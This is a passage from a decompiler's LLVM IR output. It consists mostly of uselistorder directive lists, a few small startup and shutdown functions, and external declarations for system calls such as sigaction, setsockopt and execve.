  uselistorder i32 -4, { 66, 15, 52, 53, 16, 17, 18, 19, 20, 54, 55, 72, 73, 56, 21, 70, 22, 30, 76, 77, 78, 8, 31, 32, 33, 79, 80, 81, 9, 34, 35, 36, 82, 83, 84, 10, 37, 38, 85, 29, 28, 86, 87, 88, 27, 26, 25, 24, 39, 40, 41, 42, 43, 5, 44, 6, 45, 7, 89, 23, 46, 12, 71, 2, 57, 58, 59, 61, 74, 62, 47, 48, 63, 64, 65, 90, 75, 49, 13, 11, 67, 68, 69, 14, 60, 4, 50, 51, 1, 0, 3 }
  uselistorder i32 1, { 799, 916, 246, 770, 1776, 1777, 1778, 656, 1779, 657, 1780, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 917, 523, 524, 522, 519, 518, 520, 521, 1593, 800, 1594, 1595, 918, 146, 145, 144, 142, 147, 148, 143, 1464, 1391, 1382, 920, 919, 525, 1414, 921, 527, 526, 922, 1465, 693, 1596, 923, 1597, 924, 1831, 1832, 1833, 1834, 1835, 1836, 926, 925, 532, 533, 528, 534, 531, 536, 535, 529, 530, 1598, 708, 1599, 1604, 1605, 771, 1606, 1607, 1608, 801, 802, 1609, 1610, 927, 541, 539, 540, 538, 537, 928, 1611, 929, 199, 198, 200, 1612, 930, 277, 278, 1613, 1614, 1615, 1616, 931, 270, 271, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 934, 933, 932, 429, 430, 431, 1424, 1425, 1426, 1427, 1428, 938, 937, 936, 935, 456, 455, 462, 457, 460, 459, 458, 463, 461, 454, 464, 709, 1617, 1618, 710, 1619, 1620, 1621, 1622, 1623, 803, 1624, 1625, 1626, 1627, 1628, 940, 939, 135, 133, 137, 134, 138, 139, 140, 132, 136, 686, 1633, 1629, 1630, 1631, 1632, 760, 941, 130, 131, 129, 711, 763, 804, 1450, 1451, 38, 36, 39, 37, 0, 1429, 942, 243, 242, 240, 241, 943, 945, 944, 947, 946, 181, 805, 1872, 1873, 1874, 661, 806, 1875, 950, 949, 948, 896, 40, 41, 42, 1840, 1837, 1838, 1839, 712, 1843, 951, 31, 32, 30, 35, 34, 29, 33, 713, 772, 1846, 952, 543, 544, 545, 542, 487, 1, 1634, 953, 682, 673, 1520, 1521, 1522, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 1643, 1644, 1645, 1646, 1647, 1648, 1649, 954, 103, 104, 97, 98, 99, 100, 102, 101, 694, 1430, 1431, 955, 85, 1650, 1651, 1652, 1653, 1654, 1655, 956, 547, 548, 549, 546, 957, 284, 695, 807, 1847, 958, 72, 70, 69, 73, 71, 1656, 1657, 808, 959, 210, 208, 211, 207, 209, 1848, 1849, 961, 960, 550, 551, 553, 552, 1507, 809, 1508, 1509, 962, 558, 556, 555, 559, 557, 554, 963, 483, 1850, 192, 196, 193, 194, 195, 964, 683, 968, 967, 966, 965, 443, 444, 1658, 1668, 714, 1667, 696, 665, 1670, 715, 1669, 2, 1673, 1674, 1675, 1676, 971, 970, 969, 239, 238, 1713, 1714, 1715, 1716, 1717, 1718, 1719, 1720, 773, 1721, 1722, 774, 1724, 810, 1725, 1726, 812, 3, 775, 1727, 776, 1728, 1723, 811, 1729, 1730, 764, 978, 977, 897, 976, 975, 898, 974, 973, 972, 687, 762, 1731, 1732, 1733, 1734, 1735, 716, 979, 166, 717, 4, 718, 719, 168, 167, 480, 481, 450, 449, 451, 720, 721, 433, 432, 149, 5, 6, 1845, 980, 722, 723, 1452, 1453, 1454, 1455, 982, 981, 59, 983, 58, 56, 54, 57, 55, 53, 7, 1844, 984, 43, 44, 724, 725, 1432, 1433, 986, 985, 188, 189, 187, 1434, 899, 76, 1435, 987, 900, 95, 96, 1436, 1437, 1438, 1439, 988, 901, 88, 90, 86, 87, 89, 726, 727, 1440, 1441, 1442, 991, 990, 989, 563, 561, 562, 560, 728, 729, 1443, 1444, 1445, 994, 993, 992, 568, 566, 567, 565, 564, 1852, 1853, 996, 995, 569, 570, 1446, 1447, 1448, 1449, 997, 902, 64, 66, 62, 63, 65, 1851, 8, 998, 1456, 1457, 777, 1002, 1001, 1000, 999, 203, 206, 204, 205, 201, 202, 1003, 436, 437, 438, 439, 440, 441, 1458, 1459, 813, 1460, 125, 123, 124, 1461, 1462, 1463, 1004, 730, 1005, 1006, 1466, 666, 1008, 1007, 175, 174, 814, 1467, 731, 732, 1468, 1469, 1012, 1011, 1010, 1009, 345, 346, 344, 1013, 141, 733, 1014, 1015, 571, 1470, 1471, 1016, 1017, 500, 1472, 1383, 1473, 321, 322, 1018, 1020, 1019, 397, 398, 399, 1854, 815, 1023, 1022, 1021, 816, 778, 1409, 758, 697, 1410, 817, 1411, 1412, 734, 1033, 1032, 1031, 1030, 1029, 914, 903, 1028, 904, 1027, 1026, 1025, 1024, 45, 47, 46, 48, 1034, 818, 1855, 1038, 1037, 1036, 1035, 313, 312, 314, 370, 315, 316, 819, 820, 1474, 1045, 1044, 1043, 1042, 1041, 1040, 1039, 332, 333, 334, 1046, 391, 1523, 1524, 1525, 1047, 574, 575, 573, 572, 1856, 698, 1857, 1877, 699, 1878, 1879, 1880, 1881, 1882, 1883, 1884, 1885, 1886, 1887, 1888, 1889, 905, 1049, 1048, 150, 154, 155, 157, 152, 151, 153, 156, 159, 158, 821, 1677, 1678, 1690, 1691, 1692, 1693, 1050, 906, 107, 106, 108, 700, 735, 1781, 822, 1782, 1783, 823, 684, 736, 671, 768, 769, 1784, 824, 1785, 1786, 1787, 1788, 737, 1789, 658, 1790, 1791, 825, 1792, 1793, 1063, 1062, 1061, 1060, 1059, 1058, 1057, 1056, 1055, 1054, 1053, 1052, 1051, 907, 228, 222, 225, 227, 221, 219, 220, 232, 224, 223, 218, 216, 217, 226, 230, 229, 231, 1794, 1795, 908, 1064, 79, 77, 82, 84, 80, 81, 78, 83, 1796, 1858, 1859, 1860, 672, 1861, 1862, 1863, 1065, 184, 185, 182, 186, 183, 1869, 1870, 1066, 389, 1864, 1865, 1866, 1867, 1868, 477, 476, 474, 473, 478, 475, 1797, 1068, 1067, 212, 213, 214, 215, 738, 779, 1071, 1070, 1069, 1072, 323, 324, 1073, 576, 1074, 325, 1075, 577, 1076, 578, 739, 1077, 1078, 1079, 826, 1080, 740, 827, 1081, 1082, 1542, 1087, 1086, 1085, 1084, 1083, 400, 401, 404, 403, 402, 1475, 1476, 1090, 1089, 1088, 434, 435, 465, 1890, 1091, 688, 1574, 1575, 674, 1576, 1092, 633, 638, 632, 635, 637, 639, 634, 636, 1577, 741, 828, 829, 830, 831, 1477, 1093, 390, 689, 1478, 1094, 272, 274, 275, 273, 276, 237, 236, 1526, 663, 742, 1527, 1096, 1095, 250, 251, 249, 252, 253, 1097, 303, 299, 305, 301, 300, 302, 304, 1098, 306, 308, 307, 309, 311, 310, 1528, 1099, 1479, 1100, 1480, 1101, 1581, 1103, 1102, 1892, 743, 1106, 1105, 1104, 580, 579, 1107, 446, 447, 445, 448, 317, 318, 319, 320, 1108, 504, 503, 1109, 1110, 1111, 744, 1876, 1112, 485, 832, 833, 834, 1113, 701, 702, 703, 1114, 581, 1115, 173, 1116, 405, 1117, 343, 1118, 335, 1119, 377, 1120, 420, 1121, 352, 1122, 582, 1123, 357, 1124, 583, 1125, 419, 835, 1736, 685, 1737, 1738, 836, 1739, 1758, 1129, 1128, 1127, 1126, 161, 163, 162, 160, 1130, 1131, 1133, 1132, 585, 586, 584, 837, 1900, 1134, 1600, 1601, 1602, 1603, 1798, 1799, 1135, 587, 704, 1800, 1740, 1741, 1742, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1750, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 178, 176, 177, 179, 180, 1543, 667, 112, 111, 113, 1544, 1545, 1546, 1547, 110, 109, 1672, 1671, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1904, 590, 591, 588, 589, 1871, 289, 288, 838, 1136, 1697, 1694, 1695, 1696, 668, 705, 50, 49, 51, 52, 1679, 1685, 1686, 1687, 1688, 1689, 1137, 93, 91, 94, 92, 1680, 745, 1681, 1682, 1683, 839, 1684, 1139, 1138, 1141, 1140, 425, 1143, 1142, 512, 511, 1529, 1145, 1144, 255, 765, 1801, 841, 1802, 1803, 746, 747, 1804, 1805, 842, 1806, 1808, 1809, 1810, 843, 1812, 748, 1813, 1811, 840, 1814, 844, 1815, 766, 1816, 1817, 1807, 1149, 1148, 1147, 1146, 256, 261, 258, 262, 265, 257, 263, 264, 259, 266, 260, 1818, 1150, 592, 594, 593, 597, 596, 595, 1151, 350, 349, 1819, 1820, 1821, 1152, 286, 285, 767, 690, 1823, 691, 1824, 749, 1825, 1826, 1828, 669, 1829, 845, 1830, 692, 1827, 759, 1160, 1159, 1158, 1157, 1156, 1155, 1154, 1153, 290, 292, 293, 294, 291, 846, 706, 1161, 126, 127, 128, 1822, 780, 909, 1162, 598, 847, 1481, 1482, 1163, 600, 599, 601, 1901, 781, 1902, 1903, 1164, 603, 602, 295, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 707, 1712, 1167, 1166, 1165, 606, 605, 604, 608, 607, 1169, 1168, 1170, 1659, 1660, 1661, 1662, 1663, 1664, 1665, 1666, 1173, 1172, 1171, 190, 191, 1759, 1174, 421, 1175, 609, 1176, 245, 1177, 244, 1178, 254, 1179, 279, 1180, 378, 1181, 610, 1182, 611, 1183, 612, 1184, 613, 1185, 614, 1186, 615, 1187, 371, 1483, 782, 1484, 1188, 616, 617, 1485, 783, 618, 619, 1189, 267, 1190, 501, 1191, 479, 486, 1192, 417, 1193, 620, 1194, 442, 1195, 410, 675, 426, 427, 411, 1196, 621, 428, 1197, 622, 1198, 412, 1199, 623, 1200, 624, 1201, 625, 1202, 1203, 342, 1204, 472, 1205, 418, 1206, 517, 626, 488, 1207, 508, 9, 1211, 1210, 1209, 1208, 164, 165, 1212, 354, 353, 1486, 848, 287, 339, 337, 338, 336, 510, 1893, 1894, 1895, 750, 1896, 670, 1213, 383, 382, 384, 1214, 484, 1215, 1216, 1217, 629, 630, 628, 631, 627, 1399, 1384, 1218, 416, 1219, 676, 1487, 1488, 761, 1489, 1220, 1400, 1385, 1221, 341, 340, 1401, 1386, 415, 414, 10, 849, 1387, 1222, 1223, 11, 197, 1388, 235, 233, 234, 850, 1224, 363, 1225, 409, 677, 1227, 1226, 1228, 1897, 1229, 358, 359, 751, 1413, 509, 1230, 1231, 506, 505, 507, 413, 1490, 678, 1232, 1491, 679, 1233, 1234, 406, 1235, 361, 360, 362, 12, 169, 1492, 369, 368, 13, 752, 1493, 372, 373, 374, 376, 375, 1236, 171, 170, 172, 1237, 121, 120, 122, 1238, 1239, 641, 643, 640, 644, 642, 1240, 119, 117, 118, 116, 1241, 114, 1242, 648, 647, 645, 646, 1243, 387, 385, 386, 388, 1244, 115, 469, 468, 851, 1245, 61, 60, 502, 852, 1494, 14, 15, 452, 407, 16, 17, 75, 1495, 1246, 26, 25, 27, 28, 280, 282, 281, 853, 1247, 327, 326, 854, 1248, 330, 328, 329, 331, 1250, 1249, 283, 855, 856, 1252, 1251, 857, 858, 1510, 1257, 1256, 1255, 1254, 1253, 1259, 1258, 1260, 649, 1261, 1262, 466, 859, 1511, 1512, 860, 1513, 1268, 1267, 1266, 1265, 1264, 1263, 247, 248, 1269, 1270, 1496, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1280, 1279, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1497, 18, 19, 1498, 1299, 268, 269, 1499, 105, 453, 21, 1500, 753, 1501, 20, 1300, 67, 68, 1502, 754, 1503, 1301, 298, 297, 296, 1302, 1303, 1898, 1304, 861, 1504, 1305, 516, 1306, 467, 1899, 1307, 355, 356, 862, 1505, 863, 1506, 22, 1312, 1311, 1310, 1309, 1308, 864, 23, 1891, 1313, 379, 380, 1315, 1314, 366, 367, 365, 364, 1316, 396, 392, 395, 394, 393, 1317, 1390, 1318, 348, 347, 680, 865, 1319, 681, 866, 1320, 351, 1321, 381, 1322, 470, 471, 1323, 423, 422, 424, 1514, 490, 489, 867, 868, 1324, 1325, 408, 871, 872, 1515, 870, 1402, 1403, 755, 1404, 1405, 1406, 869, 1407, 1408, 1389, 1516, 1518, 873, 1519, 874, 1329, 1328, 1327, 1326, 493, 491, 497, 496, 495, 494, 498, 492, 499, 875, 1517, 1330, 650, 651, 652, 1331, 515, 876, 877, 1332, 482, 878, 1333, 756, 1334, 513, 1335, 784, 1841, 1842, 1530, 1531, 1532, 1533, 1534, 1535, 882, 1536, 1537, 662, 880, 881, 883, 1538, 884, 1539, 879, 1540, 1541, 1344, 1343, 1342, 1341, 1340, 1339, 1338, 1337, 1336, 888, 885, 886, 887, 889, 1348, 1347, 1346, 1345, 1350, 1349, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1351, 911, 910, 1352, 1353, 1558, 659, 664, 1559, 1560, 1561, 1562, 660, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1356, 1355, 912, 1354, 74, 1357, 1572, 890, 891, 892, 1359, 1358, 1573, 1360, 514, 1578, 893, 1364, 1363, 1362, 1361, 894, 1579, 895, 1580, 1370, 1369, 1368, 1367, 1366, 1365, 1582, 1583, 1372, 1371, 1373, 913, 757, 1584, 24, 1585, 1374, 1376, 1375, 1378, 1377, 786, 1760, 1761, 785, 1762, 1763, 787, 788, 1764, 1765, 789, 790, 1766, 1767, 791, 792, 1768, 1769, 793, 794, 1770, 1771, 795, 796, 1772, 1773, 797, 798, 1774, 1775, 1379, 1380, 1381, 655, 654, 653, 915 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_1c38c = load i32, i32* @r0, align 4
  ret i32 %v5_1c38c

; uselistorder directives
  uselistorder i32* @r0, { 21, 480, 22, 481, 23, 482, 25, 24, 390, 391, 392, 393, 18, 118, 119, 120, 191, 192, 193, 168, 169, 170, 171, 172, 127, 0, 504, 505, 506, 396, 394, 395, 26, 173, 174, 175, 176, 397, 398, 399, 185, 105, 27, 194, 537, 538, 539, 540, 541, 542, 111, 508, 186, 187, 28, 509, 512, 29, 30, 9, 502, 503, 400, 401, 402, 513, 514, 515, 177, 267, 268, 178, 516, 31, 208, 209, 403, 404, 412, 425, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 110, 458, 459, 460, 461, 462, 463, 464, 128, 129, 33, 35, 510, 34, 36, 188, 189, 37, 179, 180, 181, 182, 183, 184, 39, 518, 519, 520, 521, 522, 40, 41, 517, 190, 543, 42, 195, 196, 197, 198, 43, 511, 38, 199, 44, 200, 201, 202, 45, 523, 524, 525, 526, 46, 203, 204, 205, 47, 527, 528, 130, 131, 132, 133, 134, 135, 136, 137, 529, 530, 48, 206, 207, 544, 306, 307, 308, 309, 49, 50, 423, 52, 483, 484, 53, 531, 534, 535, 532, 54, 549, 550, 99, 100, 101, 269, 552, 553, 554, 555, 556, 557, 558, 559, 548, 113, 114, 116, 117, 589, 75, 583, 76, 77, 78, 79, 19, 331, 332, 334, 335, 102, 560, 561, 355, 210, 80, 310, 311, 312, 313, 314, 315, 211, 212, 213, 214, 215, 376, 377, 565, 580, 582, 55, 56, 567, 57, 566, 316, 317, 109, 318, 319, 58, 568, 20, 570, 571, 545, 546, 547, 572, 581, 333, 287, 465, 466, 467, 468, 469, 470, 471, 472, 32, 115, 67, 68, 485, 486, 487, 121, 59, 588, 51, 417, 418, 419, 420, 421, 422, 60, 413, 414, 415, 416, 536, 424, 320, 488, 489, 490, 4, 61, 491, 492, 5, 7, 1, 2, 493, 494, 6, 495, 496, 497, 62, 63, 498, 499, 500, 3, 501, 533, 216, 217, 218, 586, 587, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 474, 475, 405, 406, 407, 408, 409, 410, 411, 219, 220, 221, 222, 223, 224, 64, 65, 66, 585, 321, 584, 69, 270, 271, 16, 562, 563, 225, 226, 227, 228, 573, 551, 70, 71, 72, 73, 229, 106, 230, 138, 231, 232, 382, 569, 233, 234, 235, 74, 575, 576, 112, 81, 87, 88, 89, 236, 237, 238, 10, 239, 240, 241, 242, 243, 83, 139, 244, 11, 245, 246, 247, 248, 249, 140, 250, 251, 272, 273, 274, 275, 107, 276, 277, 278, 279, 280, 281, 282, 283, 252, 256, 383, 384, 385, 253, 254, 255, 85, 574, 288, 289, 290, 86, 366, 367, 141, 142, 143, 144, 145, 146, 147, 148, 577, 578, 149, 150, 151, 152, 153, 154, 155, 156, 157, 476, 477, 368, 369, 356, 357, 370, 371, 158, 159, 160, 161, 358, 359, 162, 163, 348, 349, 257, 82, 579, 258, 259, 260, 261, 264, 262, 263, 265, 266, 564, 90, 164, 165, 17, 91, 284, 285, 286, 12, 291, 292, 84, 166, 13, 293, 294, 295, 296, 386, 387, 388, 92, 297, 122, 123, 103, 124, 125, 126, 104, 298, 301, 302, 303, 304, 108, 299, 15, 300, 14, 167, 305, 8, 97, 507, 98, 322, 323, 324, 325, 326, 327, 328, 329, 330, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 350, 351, 352, 353, 354, 360, 361, 362, 363, 364, 365, 372, 373, 374, 375, 378, 379, 380, 381, 389, 473, 478, 479, 93, 94, 95, 96 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1c394 = load i32, i32* @r4, align 4
  %v0_1c39c = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_1c394)
  ret i32 %v0_1c39c

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 17, 67, 69, 70, 71, 39, 36, 40, 41, 74, 75, 77, 78, 3, 72, 83, 0, 1, 19, 20, 55, 79, 80, 81, 82, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 86, 87, 33, 34, 84, 85, 35, 37, 38, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 88, 89, 90, 4, 5, 6, 7, 8, 9, 10, 11, 91, 12, 13, 56, 57, 93, 73, 95, 94, 96, 97, 98, 99, 100, 2, 103, 65, 92, 66, 61, 101, 58, 59, 60, 102, 14, 15, 64, 16, 76, 62, 63, 18, 68 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 226, 1002, 796, 6, 797, 798, 5, 799, 800, 801, 19, 802, 18, 803, 804, 805, 310, 75, 76, 77, 78, 311, 312, 313, 314, 315, 320, 321, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 316, 20, 317, 318, 319, 1068, 1069, 806, 809, 812, 813, 814, 815, 816, 807, 808, 810, 811, 21, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 832, 831, 833, 834, 835, 836, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 22, 24, 251, 23, 252, 255, 253, 254, 837, 838, 839, 840, 2, 841, 842, 843, 844, 845, 846, 847, 850, 848, 849, 62, 267, 268, 269, 270, 271, 272, 256, 327, 328, 329, 330, 322, 323, 1213, 1205, 1206, 1207, 25, 1212, 1070, 1073, 1074, 1075, 1078, 1079, 273, 274, 275, 276, 285, 286, 287, 1080, 1101, 1102, 1103, 107, 108, 851, 852, 853, 854, 855, 26, 27, 1067, 1104, 1105, 856, 857, 28, 858, 859, 860, 861, 862, 863, 29, 864, 865, 866, 867, 868, 869, 870, 1106, 1107, 871, 872, 873, 874, 875, 876, 879, 880, 881, 1108, 1109, 1110, 1111, 554, 555, 556, 557, 558, 257, 258, 1112, 1113, 1114, 1115, 1116, 382, 383, 384, 385, 386, 387, 882, 893, 892, 895, 894, 8, 897, 896, 898, 7, 945, 946, 947, 948, 949, 950, 951, 952, 953, 30, 954, 955, 956, 957, 960, 963, 967, 968, 969, 970, 971, 972, 973, 974, 109, 110, 111, 112, 113, 114, 1081, 1082, 1083, 1084, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 277, 278, 279, 280, 31, 281, 282, 283, 284, 352, 1085, 1086, 1087, 1088, 1089, 259, 260, 261, 262, 263, 264, 265, 1117, 1118, 266, 288, 289, 290, 291, 334, 335, 292, 293, 294, 295, 296, 297, 298, 299, 300, 303, 301, 32, 302, 304, 305, 306, 307, 308, 309, 324, 325, 326, 1214, 1215, 1216, 1221, 69, 331, 9, 332, 333, 336, 33, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 1217, 1218, 1219, 1220, 347, 348, 349, 350, 351, 1098, 1099, 1100, 353, 354, 355, 356, 357, 358, 359, 360, 361, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 362, 363, 364, 365, 366, 367, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1136, 115, 116, 117, 118, 119, 34, 120, 121, 122, 123, 35, 124, 125, 126, 368, 369, 370, 1137, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1203, 1204, 371, 373, 374, 372, 375, 376, 377, 378, 379, 380, 381, 1222, 1223, 1243, 639, 640, 641, 642, 643, 644, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1244, 1245, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 899, 900, 901, 902, 903, 913, 914, 36, 915, 916, 1004, 1167, 1168, 1169, 37, 1170, 1171, 1172, 1173, 38, 1174, 1175, 1176, 39, 1177, 1178, 1179, 1180, 1181, 1182, 11, 1190, 0, 1191, 1192, 40, 1183, 1184, 1185, 1186, 1187, 1005, 1, 1262, 1263, 1264, 1265, 1266, 1267, 388, 559, 560, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1224, 1242, 1355, 1356, 1357, 1360, 70, 1368, 63, 1350, 1351, 1352, 1353, 1354, 1281, 1282, 1283, 693, 694, 695, 696, 697, 698, 699, 700, 561, 562, 1284, 1285, 726, 727, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 645, 646, 647, 648, 649, 765, 766, 408, 409, 410, 650, 651, 652, 653, 405, 406, 407, 411, 412, 413, 767, 768, 769, 770, 1349, 1298, 1299, 1225, 41, 654, 655, 656, 657, 658, 42, 659, 43, 660, 661, 1300, 44, 45, 1302, 1303, 1304, 1305, 1306, 1307, 1226, 1227, 1240, 1241, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 593, 594, 595, 596, 1210, 1211, 1138, 1139, 715, 716, 717, 414, 964, 415, 416, 417, 418, 419, 958, 959, 742, 743, 965, 966, 1071, 1072, 744, 975, 976, 977, 978, 979, 980, 46, 981, 982, 983, 984, 985, 986, 987, 1361, 1362, 1363, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 917, 918, 919, 920, 921, 922, 923, 924, 904, 909, 910, 911, 912, 905, 906, 3, 907, 908, 1200, 47, 1201, 1202, 925, 48, 926, 927, 662, 49, 663, 664, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1035, 1034, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 50, 1043, 1044, 1045, 1051, 1052, 1053, 1054, 4, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 51, 1062, 52, 1063, 1064, 1065, 1066, 127, 128, 129, 1046, 1048, 1047, 1049, 1050, 1188, 1189, 420, 71, 421, 422, 423, 424, 425, 426, 427, 428, 64, 429, 1364, 1365, 1366, 1367, 928, 929, 930, 931, 932, 933, 934, 935, 936, 53, 937, 54, 938, 939, 940, 941, 942, 943, 944, 988, 989, 990, 991, 883, 884, 885, 886, 887, 888, 889, 55, 56, 890, 891, 1308, 1309, 665, 666, 728, 729, 1310, 1311, 1347, 1348, 17, 563, 745, 746, 1312, 632, 633, 513, 514, 515, 516, 508, 509, 634, 635, 877, 878, 430, 431, 432, 433, 434, 439, 435, 436, 437, 438, 961, 962, 564, 440, 1313, 1314, 613, 614, 441, 454, 455, 1315, 1316, 1134, 1135, 565, 566, 667, 668, 1076, 1077, 1358, 1359, 669, 670, 671, 57, 672, 673, 674, 675, 442, 777, 1208, 1209, 1286, 597, 1287, 58, 1288, 1289, 1290, 1291, 443, 444, 72, 445, 446, 65, 447, 448, 449, 450, 451, 452, 1317, 1318, 1319, 453, 1268, 1269, 456, 457, 458, 462, 459, 460, 461, 463, 464, 130, 131, 132, 133, 465, 12, 79, 80, 81, 82, 83, 84, 59, 85, 86, 87, 778, 779, 780, 88, 89, 60, 90, 91, 466, 93, 98, 94, 95, 92, 96, 97, 1301, 467, 468, 469, 470, 471, 476, 1323, 1324, 1327, 1328, 472, 473, 474, 475, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 13, 487, 488, 489, 490, 491, 14, 496, 497, 492, 493, 494, 495, 498, 499, 500, 501, 502, 1329, 1330, 1331, 503, 504, 505, 134, 135, 136, 137, 506, 507, 1325, 1326, 510, 511, 512, 517, 518, 519, 520, 521, 138, 139, 140, 522, 523, 524, 567, 568, 569, 570, 571, 572, 573, 579, 574, 575, 576, 577, 578, 525, 526, 527, 781, 782, 783, 784, 785, 786, 787, 788, 528, 529, 530, 531, 532, 1320, 1321, 1322, 598, 599, 600, 747, 748, 749, 750, 751, 752, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 1332, 1333, 1334, 1335, 1336, 1337, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 676, 677, 678, 679, 680, 681, 992, 993, 994, 995, 996, 997, 753, 754, 755, 756, 757, 758, 730, 731, 732, 733, 734, 735, 759, 760, 761, 762, 763, 764, 199, 200, 201, 202, 203, 204, 205, 206, 736, 737, 738, 739, 740, 741, 207, 208, 209, 210, 718, 719, 720, 721, 722, 723, 533, 534, 66, 535, 536, 537, 538, 539, 543, 544, 545, 546, 540, 541, 542, 1339, 1338, 547, 1340, 1341, 1344, 1345, 1346, 1342, 1343, 548, 549, 73, 550, 551, 552, 553, 1292, 1293, 1294, 1295, 1296, 1297, 211, 212, 213, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 601, 602, 603, 15, 608, 604, 605, 606, 607, 609, 610, 611, 612, 789, 790, 791, 794, 795, 792, 793, 74, 61, 10, 99, 100, 101, 102, 103, 67, 104, 105, 106, 16, 615, 630, 631, 616, 624, 625, 626, 617, 618, 619, 68, 620, 622, 621, 623, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 627, 628, 629, 636, 637, 638, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 724, 725, 771, 772, 773, 774, 775, 776, 998, 999, 1000, 1001, 225, 1003 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @setrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @sigsuspend(%_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
